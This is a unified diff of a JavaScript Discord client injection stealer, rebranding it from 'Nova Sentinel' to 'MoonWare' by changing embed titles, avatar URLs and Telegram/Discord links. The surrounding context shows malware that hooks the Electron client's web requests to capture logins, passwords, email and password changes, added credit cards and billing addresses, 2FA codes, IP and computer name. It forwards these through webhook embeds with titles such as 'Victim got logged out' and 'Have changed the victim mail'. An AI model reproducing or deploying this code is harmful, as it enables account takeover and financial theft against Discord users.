@@ -77,9 +77,9 @@ async function execScript(str) {
 
 const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
   var params = {
-    username: "Nova Sentinel",
+    username: "MoonWare",
     avatar_url:
-      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png",
+      "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
     content: "",
     embeds: [
       {
@@ -92,7 +92,7 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
         },
 
         footer: {
-          text: ` [${config.creator}] | https://discord.gg/kVcKDj7tBQ`,
+          text: ` [${config.creator}] | t.me/MoonWares`,
         },
       },
     ],
@@ -584,7 +584,7 @@ const FirstTime = async () => {
       var Friends = parseFriends(friends);
       if (!user.avatar)
         var userAvatar =
-          "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+          "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png";
       if (!user.banner)
         var userBanner =
           "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
@@ -600,7 +600,7 @@ const FirstTime = async () => {
           `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
         ));
       var params = await makeEmbed({
-        title: " Nova Sentinel Initialized",
+        title: "MoonWare Injected",
         description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
         fields: [
           {
@@ -640,11 +640,11 @@ const FirstTime = async () => {
           },
           {
             name: "@Copyright",
-            value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://github.com/KSCH-58/Malicord)`,
+            value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://discord.gg/grabber)`,
             inline: !0,
           },
           {
-            name: "Nova Files",
+            name: "MoonWare Files",
             value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
             inline: !0,
           },
@@ -739,7 +739,7 @@ const FirstTime = async () => {
           ));
         var params = await makeEmbed({
           title:
-            "<:nova:1132934190032244786> Nova Sentinel Victim got logged out",
+            "<:nova:1132934190032244786> MoonWare Victim got logged out",
           description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
           fields: [
             {
@@ -779,7 +779,7 @@ const FirstTime = async () => {
             },
             {
               name: "@Copyright",
-              value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+              value: `[MoonWare 2023 <:nova:1132934190032244786>](https://t.me/MoonWares)`,
               inline: !0,
             },
             {
@@ -944,7 +944,7 @@ async function BoukiTuclcavectesfonctions() {
   );
   if (!user.avatar)
     var userAvatar =
-      "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png";
+      "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png";
   if (!user.banner)
     var userBanner =
       "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/giphy.gif";
@@ -1823,7 +1823,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               } = await BoukiTuclcavectesfonctions();
               var password = data.password;
               var params = await makeEmbed({
-                title: "<:nova:1132934190032244786> Nova Sentinel User Login",
+                title: "<:nova:1132934190032244786> MoonWare User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
@@ -1864,11 +1864,11 @@ electron.session.defaultSession.webRequest.onCompleted(
                   },
                   {
                     name: "@Copyright",
-                    value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                    value: `[MoonWare 2023 <:nova:1132934190032244786>](https://t.me/MoonWares)`,
                     inline: !0,
                   },
                   {
-                    name: "Nova Files",
+                    name: "MoonWare Files",
                     value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                     inline: !0,
                   },
@@ -1955,7 +1955,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             var password = data.password;
 
             var params = await makeEmbed({
-              title: "<:nova:1132934190032244786> Nova Sentinel User Login",
+              title: "<:nova:1132934190032244786> MoonWare User Login",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1996,7 +1996,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 },
                 {
                   name: "@Copyright",
-                  value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                  value: `[MoonWare 2023 <:nova:1132934190032244786>](https://t.me/MoonWares)`,
                   inline: !0,
                 },
                 {
@@ -2064,7 +2064,7 @@ electron.session.defaultSession.webRequest.onCompleted(
         if (data.new_password) {
           var params = await makeEmbed({
             title:
-              "<:nova:1132934190032244786> Nova Sentinel Detect Password Changed",
+              "<:nova:1132934190032244786> MoonWare Detect Password Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
@@ -2105,7 +2105,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               },
               {
                 name: "@Copyright",
-                value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                value: `[MoonWare 2023 <:nova:1132934190032244786>](https://t.me/MoonWares)`,
                 inline: !0,
               },
               {
@@ -2189,7 +2189,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               if (res.username) {
                 var params = await makeEmbed({
                   title:
-                    "<:nova:1132934190032244786> Nova Sentinel Have changed the victim mail",
+                    "<:nova:1132934190032244786> MoonWare Have changed the victim mail",
                   color: config["embed-color"],
                   description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                   fields: [
@@ -2215,7 +2215,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                     },
                     {
                       name: "@Copyright",
-                      value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                      value: `[MoonWare 2023 <:nova:1132934190032244786>](https://t.me/MoonWares)`,
                       inline: !1,
                     },
                     {
@@ -2254,7 +2254,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           }
           var params = await makeEmbed({
             title:
-              "<:nova:1132934190032244786> Nova Sentinel Detect Email Changed",
+              "<:nova:1132934190032244786> MoonWare Detect Email Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
@@ -2295,7 +2295,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               },
               {
                 name: "@Copyright",
-                value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                value: `[MoonWare 2023 <:nova:1132934190032244786>](https://t.me/MoonWares)`,
                 inline: !0,
               },
               {
@@ -2378,7 +2378,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 dt.billing_address;
               var params = await makeEmbed({
                 title:
-                  "<:nova:1132934190032244786> Nova Sentinel User Credit Card Added",
+                  "<:nova:1132934190032244786> MoonWare User Credit Card Added",
                 color: config["embed-color"],
                 fields: [
                   {
@@ -2474,7 +2474,7 @@ electron.session.defaultSession.webRequest.onCompleted(
         }
 
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> Nova Sentinel User Enable 2FA",
+          title: "<:nova:1132934190032244786> MoonWare User Enable 2FA",
           color: config["embed-color"],
           fields: [
             {
@@ -2539,7 +2539,7 @@ electron.session.defaultSession.webRequest.onCompleted(
         break;
       case request.url.endsWith("/disable"):
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> Nova Sentinel User Removed 2FA",
+          title: "<:nova:1132934190032244786> MoonWare User Removed 2FA",
           color: config["embed-color"],
           fields: [
             {
@@ -2613,7 +2613,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           }
         }
         var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> Nova Sentinel User 2FA Codes",
+          title: "<:nova:1132934190032244786> MoonWare User 2FA Codes",
           color: config["embed-color"],
           fields: [
             {
